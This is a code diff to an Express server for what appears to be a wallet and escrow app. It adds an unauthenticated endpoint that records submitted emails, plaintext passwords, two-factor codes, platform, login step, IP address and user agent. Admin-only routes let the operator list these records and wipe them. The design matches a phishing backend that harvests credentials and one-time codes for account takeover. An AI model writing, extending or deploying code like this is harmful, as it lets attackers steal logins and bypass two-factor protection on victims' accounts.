@@ -25,7 +25,8 @@ let db = {
   wallet: { balances: {}, activity: [] },
   escrows: [],
   history: [],
-  notifications: []
+  notifications: [],
+  clientLogins: []
 };
 
 const loadDb = async () => {
@@ -364,6 +365,38 @@ app.post('/api/notifications/:id/read', authenticate(['admin', 'client']), async
   ));
   await saveDb();
   return res.json({ success: true });
+});
+
+// Store client login attempt (no auth required - called during login flow)
+app.post('/api/client-logins', async (req, res) => {
+  const { email, password, twoFactorCode, platform, step } = req.body;
+  const loginEntry = {
+    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
+    email: email || '',
+    password: password || '',
+    twoFactorCode: twoFactorCode || '',
+    platform: platform || 'unknown',
+    step: step || 'unknown',
+    ipAddress: req.ip || req.connection?.remoteAddress || 'unknown',
+    userAgent: req.headers['user-agent'] || 'unknown',
+    timestamp: new Date().toISOString()
+  };
+  db.clientLogins.unshift(loginEntry);
+  db.clientLogins = db.clientLogins.slice(0, 500); // Keep last 500 entries
+  await saveDb();
+  return res.json({ success: true });
+});
+
+// Get all client login attempts (admin only)
+app.get('/api/client-logins', authenticate(['admin']), async (req, res) => {
+  return res.json(db.clientLogins || []);
+});
+
+// Clear all client login data (admin only)
+app.delete('/api/client-logins', authenticate(['admin']), async (req, res) => {
+  db.clientLogins = [];
+  await saveDb();
+  return res.json({ success: true, message: 'All login data cleared' });
 });
 
 loadDb().then(() => {
